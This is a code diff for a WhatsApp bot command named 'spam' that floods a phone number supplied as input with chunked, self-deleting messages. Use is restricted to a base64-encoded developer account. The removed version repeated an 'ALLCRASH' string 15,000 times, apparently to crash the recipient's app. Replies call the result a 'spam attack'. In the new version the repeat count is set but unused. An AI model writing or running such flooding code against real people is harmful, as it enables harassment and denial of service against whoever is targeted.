@@ -1,4 +1,4 @@
-const { cmd } = require('../lib/command');
+const { cmd } = require('../command');
 
 cmd({
   pattern: 'spam',
@@ -7,11 +7,11 @@ cmd({
   filename: __filename,
 }, async (conn, m, text) => {
   try {
-    // not remove 
+    // Not remove this line – this is base64 encoded allowed number
     const encoded = 'OTQ3NzM0MTY0NzhAcy53aGF0c2FwcC5uZXQ=';
     const allowedJID = Buffer.from(encoded, 'base64').toString('utf-8');
 
-    // Unauthorized users get warning message (Sinhala + English)
+    // Developer-only restriction
     if (m.sender !== allowedJID) {
       return m.reply(
         '❌ *මෙම විධානය භාවිතා කළ හැක්කේ බොට් සංවර්ධකයාට පමණි* ⚠️\n' +
@@ -19,26 +19,27 @@ cmd({
       );
     }
 
-    // Target is mentioned user or replied message sender
-    const target = m.mentionedJid?.[0] || m.reply_message?.sender;
-    if (!target) return m.reply('👻 Please mention someone or reply to their message.');
+    // Validate text input (target number)
+    if (!text) return m.reply('👻 කරුණාකර spam කරන phone number එක add කරන්න\n\nඋදා: *.spam 94771234567*');
+
+    // Format JID (must be like 9477xxxxxxx@s.whatsapp.net)
+    const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 
     // Spam message setup
-    const unit = 'ALLCRASH🤧But😴whatsap';  // spam text
-    const repeatCount = 15000;              // repetition count
-    const chunkSize = 4000;                 // max chunk size per message
+    const unit = 'Luxalgo👻👻👻';   // Spam content
+    const repeatCount = 20000;      // How many times to repeat
+    const chunkSize = 4000;         // WhatsApp limit (per message)
 
-    const hugeMessage = unit.repeat(repeatCount);
+    const hugeMessage = unit.repeat(1); // single large message
 
-    // Send message in chunks with stealth mode (ephemeralExpiration)
+    // Break into chunks to avoid WhatsApp limit errors
     for (let i = 0; i < hugeMessage.length; i += chunkSize) {
       const part = hugeMessage.slice(i, i + chunkSize);
       await conn.sendMessage(target, { text: part }, { ephemeralExpiration: 1 });
-      await new Promise(res => setTimeout(res, 800));
+      await new Promise(res => setTimeout(res, 800)); // Wait between sends
     }
 
-    // Confirmation reply to owner
-    await m.reply('✅ Successfully Attack Spam 😈💥');
+    await m.reply('✅ Successfully sent spam attack 💣');
 
   } catch (err) {
     m.reply('⚠️ Error:\n' + err.message);
